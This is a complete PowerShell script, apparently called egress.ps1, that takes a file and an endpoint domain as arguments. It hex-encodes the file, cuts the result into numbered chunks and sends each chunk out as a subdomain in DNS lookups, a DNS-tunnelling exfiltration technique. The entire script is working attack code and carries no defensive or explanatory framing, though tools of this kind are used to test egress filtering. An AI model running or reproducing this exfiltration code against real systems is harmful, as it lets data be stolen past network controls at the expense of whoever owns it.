$inputFile = $args[0]
$url = $args[1]

if ([string]::IsNullOrEmpty($inputFile) -Or [string]::IsNullOrEmpty($url))
{
    Write-Host "Syntax: .\egress.ps1 [FILE] [ENDPOINT]"
    break
}

$inputFile = (Resolve-Path -Path $inputFile)
$chunkSize = 63

Write-Host "Reading file"
$data = [IO.File]::ReadAllBytes($inputFile)
$encoded = ''

Write-Host "Encoding file"
Foreach ($byte in $data) {
    $encoded = $encoded + [System.String]::Format("{0:X2}", [System.Convert]::ToUInt32($byte))
}
$encoded = $encoded.ToLower()

$allLines = [Math]::Ceiling($encoded.Length / $chunkSize)
$paddingSize = $allLines.ToString().Length
$paddingFormat = '{0:d' + $paddingSize + '}'

Write-Host 'All chunks are' $allLines

For ($i = 0; $i -lt $allLines; $i++) {
    $chunk = $paddingFormat -f ($i + 1)
    if ($encoded.Length -gt $chunkSize) {
        $line = $encoded.Substring(0, $chunkSize)
        $encoded = $encoded.Substring($chunkSize)
    } else {
        $line = $encoded
    }
    
    $line = $line.Replace('/', '-')
    
    $domain = $chunk + '.' + $line + '.' + $url
    Write-Host $domain
    
    Resolve-DnsName -Name $domain -Type A -QuickTimeout -DnsOnly | Out-Null
}
